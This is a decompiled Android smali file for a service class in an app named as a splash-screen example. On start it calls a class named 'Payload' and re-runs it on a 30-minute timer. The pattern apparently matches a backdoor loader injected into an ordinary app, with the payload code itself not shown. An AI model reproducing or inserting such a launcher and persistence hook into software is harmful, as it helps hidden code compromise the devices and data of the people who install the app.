.class public Lid/web/aiueo/androidsplashscreen/MyIntentService;
.super Landroid/app/Service;
.source "MyIntentService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lid/web/aiueo/androidsplashscreen/MyIntentService$100000000;
    }
.end annotation


# instance fields
.field beeperHandle:Ljava/util/concurrent/ScheduledFuture;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/ScheduledFuture",
            "<*>;"
        }
    .end annotation
.end field

.field private final scheduler:Ljava/util/concurrent/ScheduledExecutorService;


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    .line 17
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    move-object v2, v0

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/util/concurrent/Executors;->newScheduledThreadPool(I)Ljava/util/concurrent/ScheduledExecutorService;

    move-result-object v3

    iput-object v3, v2, Lid/web/aiueo/androidsplashscreen/MyIntentService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 51
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 23
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move v3, p3

    move-object v5, v0

    invoke-static {v5}, Lid/web/aiueo/androidsplashscreen/Payload;->start(Landroid/content/Context;)V

    .line 24
    move-object v5, v0

    invoke-virtual {v5}, Lid/web/aiueo/androidsplashscreen/MyIntentService;->periodicallyAttempt()V

    .line 26
    const/4 v5, 0x1

    move v0, v5

    return v0
.end method

.method public periodicallyAttempt()V
    .locals 15
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 33
    move-object v0, p0

    const/16 v6, 0x708

    int-to-long v6, v6

    move-wide v2, v6

    .line 35
    new-instance v6, Lid/web/aiueo/androidsplashscreen/MyIntentService$100000000;

    move-object v14, v6

    move-object v6, v14

    move-object v7, v14

    move-object v8, v0

    invoke-direct {v7, v8}, Lid/web/aiueo/androidsplashscreen/MyIntentService$100000000;-><init>(Lid/web/aiueo/androidsplashscreen/MyIntentService;)V

    move-object v4, v6

    .line 45
    move-object v6, v0

    move-object v7, v0

    iget-object v7, v7, Lid/web/aiueo/androidsplashscreen/MyIntentService;->scheduler:Ljava/util/concurrent/ScheduledExecutorService;

    move-object v8, v4

    move-wide v9, v2

    move-wide v11, v2

    sget-object v13, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface/range {v7 .. v13}, Ljava/util/concurrent/ScheduledExecutorService;->scheduleAtFixedRate(Ljava/lang/Runnable;JJLjava/util/concurrent/TimeUnit;)Ljava/util/concurrent/ScheduledFuture;

    move-result-object v7

    iput-object v7, v6, Lid/web/aiueo/androidsplashscreen/MyIntentService;->beeperHandle:Ljava/util/concurrent/ScheduledFuture;

    return-void
.end method
